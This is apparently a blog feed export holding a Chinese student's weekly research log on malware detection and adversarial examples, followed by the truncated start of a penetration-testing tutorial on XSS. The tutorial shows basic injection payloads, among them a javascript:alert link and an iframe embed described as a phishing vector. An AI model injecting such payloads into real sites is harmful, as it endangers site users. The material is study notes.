id="论文学习-8">论文学习</h4><p><ahref="https://kns.cnki.net/kcms/detail/detail.aspx?dbcode=CDFD&amp;dbname=CDFDLAST2022&amp;filename=1020405886.nh&amp;uniplatform=NZKPT&amp;v=xjiG-vadnpzkvu94KN5K6owyE63keKSbdc119t_5nEfUR2a8ZsLu8ytcab9C2gM2">对抗样本技术在恶意软件检测和自动驾驶应用中的研究</a>（湖大-博士论文）</p><ul><li>在<strong>cvpr2019</strong>会议（人工智能顶会）中，直接关于对抗样本的论文有<code>67</code>篇，与对抗样本间接相关的有<code>58</code>篇；同样在网络与信息安全领域，被网安顶刊收入的相关文章中被引用的就有<code>上百</code>篇</li><li>潜在威胁：不良分子利用人工智能技术窃取用户隐私，而<strong>对抗样本</strong>技术可以欺骗不法分子的智能分析系统，从而避免损失</li></ul><figure><img src="https://s2.loli.net/2022/11/04/N71cSsw3yvhUYdE.png"alt="image-20221104100213942" /><figcaption aria-hidden="true">image-20221104100213942</figcaption></figure><ul><li><strong>防御性研究</strong><ul><li>修改训练过程或输入样本</li><li>修改检测或判定网络</li><li>采用外部网络结构</li></ul></li><li>如果在<strong>自动驾驶</strong>领域发生此类攻击将是灾难性的</li><li>本文在<strong>恶意代码检测</strong>领域提出了一种对抗性纹理恶意软件干扰攻击方法（ATMPA）</li><li>提出了一种恶意软件可视化自动检测方法（Visual-AT）</li><li><strong>人工神经网络</strong>：类似于人类大脑突触的连接结构</li><li><strong>对抗样本评价指标</strong>：<ul><li>成功率</li><li>鲁棒性</li><li>转移性（对其他模型的攻击效果）</li><li>干扰值（合适的大小）：太小不足以生成对抗样本，太大会被人眼识别</li><li>从<strong>相反</strong>的方向来说：利用对抗样本可以提高模型的抗干扰能力</li></ul></li><li>如何利用对抗样本技术来提高<strong>恶意软件的检测效率与检测精度</strong>，是目前该领域值得进一步研究的问题</li></ul><h4 id="总结-39">总结</h4><ul><li><strong>问题和思考</strong>：<ul><li>我认为非常难的一部分在于<strong>实验</strong>上，其中涉及众多全面的专业知识和必要的数学知识，以及实验设计和分析、评估实验等都是一个相当大的难题。故于我现在而言，要发表一篇不错的论文，任重而道远</li></ul></li><li><strong>上周问题解决与收获</strong>：<ul><li>目标2：恶意代码的检测是个热门研究问题，而使用机器学习和深度学习来检测恶意代码必然需要训练模型，有<strong>模型</strong>那么必然会牵扯上对抗样本。总的来说就是：恶意代码检测中的对抗样本问题。且根据<strong>前人</strong>对对抗样本的研究，关于恶意代码检测领域的文章不少。</li><li>在恶意代码检测中的对抗样本问题<strong>更为明显</strong>，因为对一个测试用例的分类错误可能会造成巨大的损失</li></ul></li></ul><figure><img src="https://s2.loli.net/2022/11/04/HUNEe4LpGr1fwkO.png"alt="image-20221104152820692" /><figcaption aria-hidden="true">image-20221104152820692</figcaption></figure><ul><li><strong>下一个目标</strong>：将从以下三点继续研究</li><li>基于生成的对抗样本训练出<strong>鲁棒性更高的模型</strong>也是个值得研究的问题</li><li>注意到<strong>对抗样本的生成</strong>也是一个值得研究的点</li><li>关于该领域的研究可以从对对抗样本的<strong>攻击或防御</strong>方面继续深挖，结合上周已经总结出的近10种攻击或防御手段</li></ul><h3 id="section-55">2022-10-28</h3><h4 id="论文学习-9">论文学习</h4><p><ahref="https://www.sciencedirect.com/science/article/pii/S0167404822001572">Adversarialmalware sample generation method based on the prototype of deep learningdetector</a>（<strong>CCF B</strong>computer and security）</p><ul><li>在多篇文章中注意到很多人研究的一个问题：<strong>基于深度学习的恶意代码检测模型的可解释性</strong>(也许中文翻译并不准确)，我觉得这个问题很<strong>难以理解</strong>，不是很懂在研究什么。暂时的理解是，解释：<strong>为什么这种深度学习模型对恶意代码的检测是否准确。</strong><ul><li><a href="https://ieeexplore.ieee.org/document/9186721">Can We TrustYour Explanations? Sanity Checks for Interpreters in Android MalwareAnalysis</a>这篇也是</li><li>本文提出了一种基于原生深度学习的生成恶意代码样本的新方法</li><li>本文讨论的对象是windows系统下的pe文件（可执行文件）</li><li>这种方法有助于理解深度学习模型的全局可解释性</li><li>对抗样本生成方法<ul><li>分成无目标攻击和有目标攻击</li><li>FGSM,I-FGSM,C&amp;W attatck</li><li>白盒测试与黑盒测试之分</li></ul></li><li>为了防止让人类感知出图像差异，增加的扰动必须有限制</li><li>一种方式是将二进制文件转化为图像，一种是将二进制文件的字节转化为灰度图像</li></ul></li></ul><h4 id="他人博文学习">他人博文学习</h4><p><a href="https://zhuanlan.zhihu.com/p/42667844">对抗样本</a></p><p><ahref="https://baidinghub.github.io/2020/04/03/%E5%AF%B9%E6%8A%97%E6%A0%B7%E6%9C%AC%EF%BC%88%E4%B8%80%EF%BC%89%E4%BB%A5%E7%BB%BC%E8%BF%B0%E5%85%A5%E9%97%A8/#%E4%B8%80%E3%80%81%E8%AE%BA%E6%96%87%E7%9B%B8%E5%85%B3%E4%BF%A1%E6%81%AF">对抗样本2</a></p><ul><li><p>AI attack</p></li><li><p>攻击分类</p><ul><li>白盒攻击</li><li>黑盒攻击</li><li>真实世界攻击</li><li>有目标攻击</li><li>无目标攻击</li></ul></li><li><p>威胁模型</p><ul><li>假正例攻击和假反例攻击</li><li>白盒攻击和黑盒攻击</li><li>有目标和无目标</li><li>单步攻击和迭代攻击</li></ul></li><li><p>扰动</p><ul><li>个体攻击和普适性攻击</li><li>优化扰动和普适性攻击</li></ul></li><li><p>基准：评价标准</p></li><li><p>对抗攻击方法(许多方法需要深度探索才能理解,需要很多<strong>数学知识</strong>解释)</p><ul><li><p>L-BFGS</p></li><li><p>FGSM</p></li><li><p>FGVM</p></li><li><p>RAND-FGSM</p></li><li><p>BIM</p></li><li><p>ILLC</p></li><li><p>JSMA</p></li><li><p>DeepF00l</p></li><li><p>CPPN EA FOOL</p></li><li><p>C&amp;W's attack(攻击蒸馏防御网络)</p></li><li><p>ZOO</p></li><li><p>Universal Perturbation(普适性攻击方法)</p></li><li><h6 id="one-pixel-attack">One Pixel Attack</h6></li><li><p>Feature Adversary</p></li><li><p>Hot/Cold</p></li><li><p>Natural GAN</p></li><li><p>Model-based Ensembling Attack</p></li><li><p>Ground-Truth Attack</p></li></ul></li><li><p>对抗防御方法</p><ul><li>网络蒸馏</li><li>对抗训练：训练对抗样本</li><li>对抗识别</li><li>输入重建</li><li>鲁棒的分类器</li><li>网络验证</li><li>集成防御</li></ul></li><li><p>问题与挑战</p><ul><li>迁移性</li><li>存在性</li></ul></li></ul><h4 id="总结-40">总结</h4><p><strong>问题：</strong></p><ul><li>本周<strong>结课科目</strong>较多，需要完成多篇小论文，科研时间有限。</li><li>关于对抗样本的<strong>认识</strong>还需要进一步提升。</li></ul><p><strong>收获：</strong></p><ul><li>对抗样本的研究是一个细致的问题，但是目前研究的还是<strong>很深</strong></li><li>这周所读的英文文献还是比较流畅，也许<strong>阅读能力</strong>提升了？</li><li>两个好用的文献<strong>数据库</strong>：<ul><li><a href="https://www.sciencedirect.com/">sciencedirect</a></li><li><a href="https://dl.acm.org/">ACM</a>（这个好像学校没花钱购买）</li></ul></li><li>感觉阅读他人文献是一种享受</li></ul><p><strong>下一个目标：</strong></p><ul><li>关于对抗样本的研究还需要花更多时间</li><li>关于<strong>对抗样本</strong>与<strong>恶意代码检测</strong>这两者如何结合的问题需要解决</li></ul><h3 id="section-56">2022-10-21</h3><h4 id="关于研究背景的补充">关于研究背景的补充</h4><p><a href="https://ieeexplore.ieee.org/document/8949524">AComprehensive Review on Malware Detection Approaches</a>（IEEEACCESS）</p><ul><li><p>利用恶意代码进行网络犯罪，造成巨大经济损失</p></li><li><p>基于特征的检测方法和基于启发式的检测方法对于检测已经发现的恶意代码家族有很好的效果，但是对于未知的恶意代码很不理想，尤其是前一种方法。</p></li><li><p>其次现在的恶意代码已经能够以内核态运行造成更大的破坏，这种恶意代码被称之为（<code>next-generation</code>），它可以轻松绕过防火墙和杀毒软件。并且，这种恶意代码能同时呈现出多种特征。</p></li></ul><figure><img src="https://s2.loli.net/2022/10/20/oy7NGkhxLuIfSFW.png"alt="传统恶意代码和新一代代码对比" /><figcaption aria-hidden="true">传统恶意代码和新一代代码对比</figcaption></figure><ul><li>随着时间的推移，研究人员提出了基于行为、基于启发式、基于模型检测的<strong>检测方法</strong>。通过这些方法，数据挖掘和机器学习也开始应用在恶意代码检测上。<strong>新的方法</strong>有：基于深度学习、基于移动设备、基于物联网的检测。</li><li>对于未知且复杂的恶意软件，基于行为、基于模型检测和基于云的方法<strong>表现更好</strong>，基于深度学习、基于移动设备和基于物联网的方法则在上述恶意软件的一部分中使用</li><li>不能绝对的说哪种方法更好，不同的情形、不同的方法有不同优势和缺陷,没有方法能检测所有新一代且复杂的malware。因此，建立一种高效的的检测方法是个挑战，是个非常值得研究的问题。</li><li><strong>研究问题探讨</strong><ul><li>设计一种能检测所有malware的算法不存在</li><li>恶意代码检测理论上是一个难题，并且恶意代码开发者使用混淆技术，使得检测更加困难<ul><li>其中谈到的<code>P和NP问题</code>难以理解</li><li>混淆技术：<ul><li>Encryption</li><li>Oligomprphic</li><li>Polymorphic</li><li>Metamorphoic</li><li>Stealth</li><li>Packaing</li></ul></li></ul></li></ul></li><li>检测技术<ul><li>检测过程<ul><li>分析<ul><li>静态和动态分析</li><li>逆向工程</li></ul></li><li>特征提取<ul><li>数据挖掘</li><li><code>n-gram模型</code>：使用静态和动态属性创建特征；增加了特征空间；降低了模型的性能</li><li><code>基于图的模型</code>：顶点表示系统调用，边表示系统调用之间的关系。</li><li>数据集：<ul><li><strong>NSL-KDD dataset</strong></li><li><strong>Drebin dataset</strong></li><li><strong>Microsoft malware classification challengedataset</strong></li><li><strong>ClaMP</strong></li><li><strong>AAGM datase</strong></li><li><strong>EMBER dataset</strong></li></ul></li><li>著名的机器学习算法：<ul><li>BN</li><li>NB</li><li>C4.5 decision tree variant (J48),</li><li>LMT</li><li>RF</li><li>KNN</li><li>MLP</li><li>SLR</li><li>SVM</li><li>SMO</li></ul></li></ul></li><li>分类</li></ul></li></ul></li></ul><h4 id="如何开展科研">如何开展科研</h4><ul><li>同时阅读两类文献<ul><li><strong>综述性文献</strong>，需非常仔细地阅读和理解</li><li>最新两三年度内相关的研究论文，了解前沿和进展，掌握自己的问题的研究历史和现状、在学科发展中占据什么样的地位。</li></ul></li><li>文献<strong>检索</strong>平台<ul><li>Google scholar</li><li>DOI</li><li>SCI-HUB</li><li>Web Of Science</li></ul></li><li>找出最顶级、权威的论文</li><li>阅读的阶段<ul><li>通过摘要看是否有感兴趣的东西，了解作者做了什么（内容目录、结论、简介）</li><li>该方向包括哪些研究内容？或者这个方向主要解决哪些问题？</li><li>针对这些问题，前人采用了哪种方法？</li><li>不同的研究团队采用了哪些不同的解决方案？各种方法各具有哪些优点？</li><li>目前该方向的最新研究进展如何？</li></ul></li></ul><h4 id="论文学习-10">论文学习</h4><ul><li><ahref="https://t.cnki.net/kcms/detail?v=7X1a-1n3lSlo7e8SD7MIrB4FNnqSB7t_ePAoPyb7UoHmdjy7X1BnKGJRTP-uE0xthwgZy7oAvyPeohpt27IF1AemI04TB997jyRzzpbNlx1tRRBs7PwTDS05-d4AuiQsZVkR1WkGtsg=&amp;uniplatform=NZKPT">深度学习赋能的恶意代码攻防研究进展</a>《计算机学报-方滨兴》<ul><li>本文讨论了深度学习在恶意代码攻击与防御上的研究现状</li><li>其中在恶意代码查杀与恶意代码检测上的研究值得关注，其中多处提到<strong>对抗样本攻击</strong></li><li>恶意代码存在形式：二进制文件、Javascript、PowerShell等</li></ul></li><li><ahref="https://www.sohu.com/a/295737605_468736">关于对抗样本恢复的研究</a><ul><li>专业性强、研究深入</li></ul></li><li><ahref="https://www.secrss.com/articles/19040">深度学习中对抗样本的防御和攻击</a><ul><li>深度神经网络<ul><li>DNN</li><li>CNN</li><li>GAN</li><li>RNN</li><li>AE</li></ul></li></ul></li><li><ahref="https://www.webofscience.com/wos/woscc/summary/4740b22c-08f3-4131-8b78-4427230ddc73-575ff030/relevance/1">malware综述检索</a></li></ul><h4 id="他人博文学习-1">他人博文学习</h4><ul><li><ahref="https://zhuanlan.zhihu.com/p/86794447">一文看懂人工智能、机器学习、深度学习与神经网络之间的区别与关系</a><ul><li>强化学习：基于反馈机制</li><li>迁移学习：将该技术方法应用于不同但相关的问题</li></ul></li><li></li></ul><h4 id="恶意代码-二进制学习记录">恶意代码-二进制（学习记录）</h4><ul><li><ahref="https://liuhaihuaaacc.gitee.io/2022/10/12/pma03-lab1/">恶意代码分析实验1传送门</a></li></ul><h4 id="总结-41">总结</h4><ul><li><p><strong>问题</strong></p><ul><li>目前确定了研究方向，了解了研究背景，但是不明确<strong>下一步</strong>具体该做些什么？</li><li>阅读文献还远远不够，意识到自己仍处在一个距离研究领域中心非常边缘的位置</li><li>内心的一个感觉是：无论进度怎么往前推，其实也会发现前面做的工作也还是不够，在后续中，仍然会重复之前的工作。</li></ul></li><li><p><strong>收获</strong></p><ul><li><p>各种技术、方法、模型眼花缭乱，需要不断积累这些专业知识。</p></li><li><p>现阶段没有必要在一些<strong>细节</strong>上纠结：了解本文提出了什么问题，用什么研究方法解决了该问题，以及得出了什么结论即可，我想。</p></li><li><p>如果不知道学什么，那就看论文吧。文献里会有答案</p></li><li><p>之前并不知道综述和常规文献的区别，本周通过阅读了几篇<strong>综述（</strong>综述可以更加快速全面地了解到研究领域的现状），对自己的研究领域有了更加深入的了解（其中尤其是认识到了研究问题的<strong>难点</strong>、<strong>意义</strong>、<strong>挑战</strong>）</p></li></ul></li><li><p><strong>下周目标</strong></p><ul><li>将上周及之前阅读论文涉及到的专业知识、方法、模型更加深入地学习</li><li>至少再阅读两篇综述文献和两篇该研究领域的文献</li><li>其中，尤其是再深入了解<strong>对抗样本</strong>这块内容</li></ul></li></ul><h3 id="section-57">2022-10-14</h3><h4 id="研究背景调查">研究背景调查</h4><ul><li>随着互联网快速发展，恶意代码数量也呈爆发式增长。2020年瑞星“云安全”系统共截获病毒样本总量1.48亿，病毒感染次数3.52亿次，恶意代码已经成为网络安全的<strong>重要威胁</strong>之一。</li><li>恶意软件检测的传统手段有<strong>静态分析和动态分析</strong>两种方式<ul><li>静态分析是指包括检查可执行文件和但不查看具体指令的一些技术</li><li>研究运行的恶意代码</li><li>但在实际应用中，受代码混淆和加壳技术的影响，这两种检测方法都存在检测结果重复性和滞后性严重等问题，同时在检测精度上也无法达到网络通信安全运行的要求。</li></ul></li><li>在利用<strong>机器学习</strong>模型检测恶意代码方面，不少学者（Laikarish,Wang,Jodavi,AL-Taharva，马洪亮，赵梓旭等人提出了不同的特征提取方法来检测恶意代码。尽管以上基于基于机器学习模型的恶意代码检测方法有较高的检测率，但是由于需要复杂的特征提取。因此机器学习方法有一定局限性。</li><li>在利用<strong>深度学习</strong>模型检测恶意代码方面，因为深度学习算法，无需像机器学习通过特征工程提取特征。深度学习算法网络，可以自动提取输入数据的特征。因此许多学者利用深度学习迷行对恶意代码进行检测，极大简化了训练过程，但是深度学习模型在对抗场景下其存在抗攻击能力较差问题</li><li>但是学习模型本身存在安全性问题，模型的有效性，取决于训练数据和测试数据遵循相同的分布假设，这种假设很可能遭到攻击者的破坏，损坏模型的安全性。攻击者在输入样本上施加微小的扰动便能被迫使分类模型作出错误的预测，这种方式称为<strong>对抗样本攻击</strong>。在恶意代码领域，攻击者利用模型的不足，生成恶意代码样本，达到绕过恶意代码检测器的目的。</li></ul><h3 id="section-58">2022-10-07</h3><h4 id="如何开展科研-1">如何开展科研</h4><ul><li><strong>本质：</strong>发现问题、分析问题、解决问题</li><li>清楚一些问题:<ul><li>我们是否清楚了科研问题</li><li>是否可以提出更加本质的科学问题</li><li>我课题的核心问题是什么</li></ul></li><li>方法：创新<ul><li>学习：科技前沿、领域的历史</li><li>研究：从一个方面深深地钻进去</li><li>猜想：引领科技前沿</li></ul></li></ul><h4 id="他人博文学习-2">他人博文学习</h4><ul><li><p><ahref="https://developer.huawei.com/consumer/cn/forum/topic/0203811848092790259?fid=0101592429757310384">详解基于机器学习的恶意代码检测技术</a></p></li><li><p><ahref="https://zhuanlan.zhihu.com/p/352004681">恶意代码检测的本质性思考</a></p></li><li><p><ahref="https://github.com/rshipp/awesome-malware-analysis/blob/main/%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E5%A4%A7%E5%90%88%E9%9B%86.md">恶意软件分析大合集</a></p></li><li><p><ahref="https://github.com/0e0w/Malware#0x01-%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E8%B5%84%E6%BA%90">深入理解恶意代码与病毒样本</a></p></li><li><p><ahref="https://github.com/ByteHackr/Machine-Learning-For-Cyber-Security/blob/master/README_ch.md#-papers">网络安全中机器学习大合集</a></p></li><li><p><ahref="https://bbs.pediy.com/thread-266139.htm">恶意代码分析方向的基础技能表</a></p></li><li><p><a href="https://github.com/hija/MalwareDataScience">Malware DataScience-Read Diary</a></p></li></ul><h4 id="研究切入点">研究切入点</h4><ul><li><strong>改进</strong>检测方法<ul><li><ahref="https://kns.cnki.net/kcms/detail/detail.aspx?dbcode=CJFD&amp;dbname=CJFDLAST2022&amp;filename=WXJY202206001&amp;uniplatform=NZKPT&amp;v=r6asokm-xQskr3fuo9nqvOKih3U9ByxGh9mQzX8eK9OhtX-76EmqGMWUhA1UoUuU">基于挤压激励网络的恶意代码家族检测方法</a></li><li><ahref="https://kns.cnki.net/kcms/detail/detail.aspx?dbcode=CAPJ&amp;dbname=CAPJLAST&amp;filename=TXXB20220919005&amp;uniplatform=NZKPT&amp;v=plc0SX0ZHq2RYg8LJ86IqmTEHDpdTiSWWW_gx-tpcJMG8aa_eyQpHgG3IayvwrsT">对抗训练驱动的恶意代码检测方法</a></li></ul></li><li>采用某种前沿技术提出新的恶意代码分类方法<ul><li><ahref="https://kns.cnki.net/kcms/detail/detail.aspx?dbcode=CJFD&amp;dbname=CJFDLAST2022&amp;filename=WHDY202201002&amp;uniplatform=NZKPT&amp;v=UbBTdaZR2oDC2Jr8iBshj49HqhCHkKDPQ4i1CvzlLreIVhO50WjwZ4lfbz2jhjxX">基于深度学习的PowerShell恶意代码家族分类研究</a></li></ul></li><li>改进算法抵抗恶意代码攻击<ul><li><ahref="https://kns.cnki.net/kcms/detail/detail.aspx?dbcode=CJFD&amp;dbname=CJFDLAST2022&amp;filename=JSJZ202201073&amp;uniplatform=NZKPT&amp;v=zTBVG7QweyKmoY1Z5XHFz0OH7gvcCqjp2OPXhvyQlgHh0JxF03f1xDsusRWLi8I8">基于改进深度森林的抗恶意代码攻击算法仿真</a></li></ul></li><li>针对一个技术细节问题提出解决方案<ul><li><ahref="https://kns.cnki.net/kcms/detail/detail.aspx?dbcode=CJFD&amp;dbname=CJFDLAST2022&amp;filename=XXAQ202112006&amp;uniplatform=NZKPT&amp;v=S2TpplvyzmzvkIUEBP95m5RsxLjdHFjAChs-PD2LAYN8AoVdGL2VSWDalRjuLZVH">基于删除PE文件头的恶意代码内存取证方法</a></li></ul></li></ul><h4 id="web-恶意代码学习">web 恶意代码学习</h4><ul><li><ahref="https://liuhaihuaaacc.gitee.io/2022/10/03/xss-wen-jian-bao-han-lou-dong-yuan-li/">传送门</a></li></ul><h4 id="malware学习">Malware学习</h4><ul><li><ahref="https://liuhaihuaaacc.gitee.io/2022/10/08/pma-dong-tai-fen-xi/">传送门</a></li></ul><h4 id="machine-learning">Machine Learning</h4><ul><li><ahref="https://liuhaihuaaacc.gitee.io/2022/10/08/ml02/">传送门</a></li></ul><h4 id="总结-42">总结</h4><ul><li>积累，厚积才能薄发</li></ul><h3 id="section-59">2022-09-30</h3><h4id="补充为什么选择恶意代码分析与检测这个方向">补充：为什么选择恶意代码分析与检测这个方向</h4><ul><li>这个研究方向与本人擅长的知识和技术：C/C++,Python,操作系统等较为契合，且该方向在学术上也较为光明</li><li>强烈的兴趣</li><li>同样考虑到毕业选择工作，而该方向在实际工作和工程中同样比较火热</li></ul><h4 id="论文期刊">论文期刊</h4><ol type="1"><li><h6id="can-we-trust-your-explanations-sanity-checks-for-interpreters-in-android-malware-analysistifs"><ahref="https://ieeexplore.ieee.org/document/9186721">Can We Trust YourExplanations? Sanity Checks for Interpreters in Android MalwareAnalysis</a>（TIFS）:</h6><ul><li>在基于机器学习的恶意软件分析中，提出了许多解释方法进行预测，但是这种解释方法不能得到统一，因此基于稳定性、稳健性和有效性这三个指标对解释方法进行健全性检查，帮助对恶意代码的分析。</li><li>许多专业术语不太了解，没看完全篇，吃力（必要技术和前沿技术的学习还不够）</li></ul></li></ol><h4 id="他人博文学习-3">他人博文学习</h4><ol type="1"><li><ahref="https://whale3070.github.io/2022/02/20/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/">机器学习与恶意代码分析</a>（该博文暂时失效）</li></ol><h4 id="恶意代码分析技术学习">恶意代码分析技术学习</h4><p><strong>注：</strong> <em>传送门</em>链接的内容均由本人逐字敲打来记录这段时期的具体所学（下同）</p><ul><li><ahref="https://liuhaihuaaacc.gitee.io/2022/10/01/practical-malware-analysis/">传送门</a></li></ul><h4 id="web方向的恶意代码学习">web方向的恶意代码学习</h4><ul><li><ahref="https://liuhaihuaaacc.gitee.io/2022/09/26/python-kai-fa-xss-sao-miao-qi/">传送门</a></li></ul><h4 id="机器学习的学习">机器学习的学习</h4><ul><li><ahref="https://liuhaihuaaacc.gitee.io/2022/10/01/machine-learning00/">传送门</a></li></ul><h4 id="总结-43">总结</h4><ul><li><p><strong>问题：</strong>这段时间，由于课堂上等各种大作业、ppt演讲的出现，以及刚入门这个较为未知的领域，因此研究方向上进展缓慢。</p></li><li><p><strong>未来计划：</strong>继续以上三项的学习。</p></li><li><p><strong>下个目标：</strong></p><ul><li>在本周期已经入门的基础上，加快研究进度</li><li>阅读英文顶级期刊的能力提升一个档次</li></ul></li></ul><h3 id="section-60">2022-09-06</h3><h4 id="ai-security">AI security</h4><ul><li><p>AI for Security</p></li><li><p>Security of AI</p><ul><li>Model Security<ul><li>inference Security</li><li>training Security</li></ul></li><li>data security</li></ul></li></ul><h4 id="网安方向分类">网安方向分类</h4><ul><li><figure><imgsrc="https://cdn.jsdelivr.net/gh/A1phaMan7/pictureBed/img/202209061944309.jpg"alt="v2-d7e84da65c80ef6580e22380cbf1918f_720w" /><figcaptionaria-hidden="true">v2-d7e84da65c80ef6580e22380cbf1918f_720w</figcaption></figure></li></ul><h4 id="恶意代码分析检测">恶意代码分析检测</h4><ul><li><p>恶意代码分析是一种解剖恶意代码的艺术，了解恶意代码是如何工作的、如何识别他，以及如何战胜和消除它</p></li><li><p><strong>关键词：</strong> 恶意代码、逆向、汇编</p></li><li><p>资料</p></li></ul><ol type="1"><li><figure><imgsrc="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209091459035.png"alt="恶意代码分析实战" /><figcaption aria-hidden="true">恶意代码分析实战</figcaption></figure></li><li><p>论文期刊</p><ol type="1"><li><h6id="a-hybrid-malicious-code-detection-method-based-on-deep-learning"><ahref="http://www.covert.io/research-papers/deep-learning-security/A%20Hybrid%20Malicious%20Code%20Detection%20Method%20based%20on%20Deep%20Learning.pdf">Ahybrid malicious code detection method based on deeplearning</a></h6></li><li><h6id="malicious-code-detection-based-on-cnns-and-multi-objective-algorithm"><ahref="https://www.sciencedirect.com/science/article/pii/S0743731518308529">Maliciouscode detection based on CNNs and multi-objective algorithm</a></h6></li><li><h6id="malicious-code-detection-based-on-image-processing-using-deep-learning"><ahref="https://dl.acm.org/doi/abs/10.1145/3194452.3194459">Malicious codedetection based on image processing using deep learning</a></h6></li><li><h6id="efficient-malicious-code-detection-using-n-gram-analysis-and-svm"><ahref="https://ieeexplore.ieee.org/abstract/document/6041963/">Efficientmalicious code detection using n-gram analysis and SVM</a></h6></li><li><h6id="static-analysis-of-executables-to-detect-malicious-patterns"><ahref="https://www.usenix.org/event/sec03/tech/full_papers/christodorescu/christodorescu_html">Staticanalysis of executables to detect malicious patterns</a></h6></li><li><h6id="malicious-code-detection-under-5g-hetnets-based-on-a-multi-objective-rbm-model"><ahref="https://ieeexplore.ieee.org/abstract/document/9318423/">Maliciouscode detection under 5G HetNets based on a multi-objective RBMmodel</a></h6></li><li><h6 id="n-gram-based-detection-of-new-malicious-code"><ahref="https://ieeexplore.ieee.org/abstract/document/1342667/">N-gram-baseddetection of new malicious code</a></h6></li><li><h6 id="malicious-code-detection-using-active-learning"><ahref="https://link.springer.com/chapter/10.1007/978-3-642-01718-6_6">Maliciouscode detection using active learning</a></h6></li><li><h6id="a-novel-solutions-for-malicious-code-detection-and-family-clustering-based-on-machine-learning"><ahref="https://ieeexplore.ieee.org/abstract/document/8863895/">A novelsolutions for malicious code detection and family clustering based onmachine learning</a></h6></li><li><h5id="feature-representation-and-selection-in-malicious-code-detection-methods-based-on-static-system-calls"><ahref="https://www.sciencedirect.com/science/article/pii/S016740481100068X">Featurerepresentation and selection in malicious code detection methods basedon static system calls</a></h5></li><li><p>（著名通讯软件telegram使用的协议mtproto）<ahref="https://ieeexplore.ieee.org/document/9833666">Four Attacks and aProof for Telegram</a>（IEEE S&amp;P）</p></li><li><h6id="malicious-code-family-classification-based-on-multi-feature-fusion-fractional-kalman-filter"><ahref="https://ieeexplore.ieee.org/document/9137472/">Malicious CodeFamily Classification Based on Multi-feature Fusion Fractional KalmanFilter</a></h6></li><li><h6id="static-detection-of-malicious-code-in-programs-using-semantic-techniques"><ahref="https://ieeexplore.ieee.org/document/9393121/">Static Detection ofMalicious Code in Programs Using Semantic Techniques</a></h6></li><li><h6id="classification-of-malicious-code-based-on-grayscale-texture-fingerprint"><ahref="https://ieeexplore.ieee.org/document/9532020/">Classification OfMalicious Code Based On Grayscale Texture Fingerprint</a></h6></li><li><h6id="a-web-page-malicious-code-detect-approach-based-on-script-execution"><ahref="https://ieeexplore.ieee.org/document/5362882/">A Web PageMalicious Code Detect Approach Based on Script Execution</a></h6></li></ol></li><li><p>博客</p><ol type="1"><li><ahref="https://cloud.tencent.com/developer/column/91034/tag-0">博主主页</a></li><li><ahref="https://cloud.tencent.com/developer/article/1967938">[AI安全论文]Powershell恶意代码检测论文总结及抽象语法树（AST）提取</a></li><li><ahref="https://blog.csdn.net/eastmount/category_9193519.html">系统安全与恶意代码分析</a></li><li><ahref="https://www.zhihu.com/topic/20027317/hot">知乎软件逆向</a></li></ol></li></ol><h4 id="联邦学习">联邦学习</h4><blockquote><p>解决数据孤岛， <ahref="https://github.com/FederatedAI/FATE">FATE开源框架</a></p></blockquote><ul><li><p>关键词：数据孤岛、数据安全、分布式</p></li><li><p>无数据交换，天然隐私保护</p></li><li><p>分类</p><ul><li><p>横向</p></li><li><p>纵向</p></li><li><p>迁移</p></li></ul></li><li><p>安全和隐私攻击</p><ul><li>CIA:机密性、完整性、可用性</li><li>投毒攻击</li><li>对抗攻击</li><li>参与者GAN攻击</li><li>推理攻击</li></ul></li></ul><h4 id="网络安全态势感知-基于收集的信息进行风险预测">网络安全态势感知：基于收集的信息进行风险预测</h4><h4 id="网络安全攻防对抗">网络安全攻防对抗</h4><h4id="软件定义网络与安全软件定义网络优化安全检测与防护">软件定义网络与安全（软件定义网络优化、安全检测与防护）</h4><h4id="区块链与安全区块链应用和优化共识安全网络安全">区块链与安全（区块链应用和优化、共识安全、网络安全）</h4><h4id="网络流量分析高性能网络报文处理数据分析">网络流量分析（高性能网络报文处理、数据分析）</h4><p><br></p><p><br></p><p><br></p><p><br></p><p><br><br></p><p><br></p><p><br></p><p><br></p><p><br></p><p><br></p><p><br></p><p><br></p><p><br></p><p><br></p><p><br></p><p><br></p><p><br></p><p><br></p><p><br></p><p><br></p><p><br></p><p><br></p><p><br></p><p><br></p><p><br></p><p><br></p><p><br></p><p><br></p><p><br></p><p><br></p><p><br></p><p><br></p><p><br></p><p><br></p><p><br></p><p><br></p><p><br></p><p><br></p><p><br></p>]]></content>
      
      
      <categories>
          
          <category> Cybersecurity </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Academic </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试基础（下）</title>
      <link href="/2022/08/24/shen-tou-ce-shi-xia/"/>
      <url>/2022/08/24/shen-tou-ce-shi-xia/</url>
      
        <content type="html"><![CDATA[<h3 id="xss">XSS</h3><ul><li><p>js</p></li><li><p>注入类</p></li><li><p>代码</p></li></ul><pre class="language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">content&#x3D;&lt;button&gt;快来点我&lt;&#x2F;button&gt;</code></pre><figure><imgsrc="https://cdn.jsdelivr.net/gh/5had0wKv/pictureBed/img/202208242128200.png"alt="image-20220824212859062" /><figcaption aria-hidden="true">image-20220824212859062</figcaption></figure><ul><li>攻击的是系统用户</li><li>存在位置<ul><li>在 <code>&lt;script&gt; &lt;/script&gt;</code>中</li><li>在响应事件中</li><li>在超链接中</li></ul></li></ul><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>javascript:alert(1)<span class="token punctuation">"</span></span> <span class="token punctuation">></span></span>点击有惊喜<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></code></pre><ul><li>iframe 框架</li></ul><pre class="language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">&lt;iframe src&#x3D;&quot;https:&#x2F;&#x2F;www.taobao.com&quot;&#x2F;&gt;</code></pre><p>钓鱼网站、</p><pre class="language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">echo 